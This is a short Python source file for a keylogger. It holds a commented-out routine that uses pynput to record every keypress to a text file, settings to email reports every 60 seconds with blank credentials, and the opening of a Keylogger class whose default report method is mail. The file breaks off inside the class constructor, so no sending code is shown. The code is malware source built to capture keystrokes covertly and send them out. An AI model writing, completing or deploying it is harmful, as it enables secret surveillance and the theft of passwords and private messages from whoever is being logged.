from pynput import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

"""
def get_key(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")

    if key_data == "Key.space":
        key_data = " "
    if key_data == "Key.shift":
        key_data = ""
    if key_data == "Key.enter":
        key_data = "\n"
    with open('keylog.txt', 'a') as file:
        file.write(key_data)

with keyboard.Listener(on_press=get_key) as listen:
    listen.join()
"""

SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADRESS = ""
EMAIL_PASSWORD = ""

class Keylogger:
    def __init__(self, interval, report_method="mail"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        

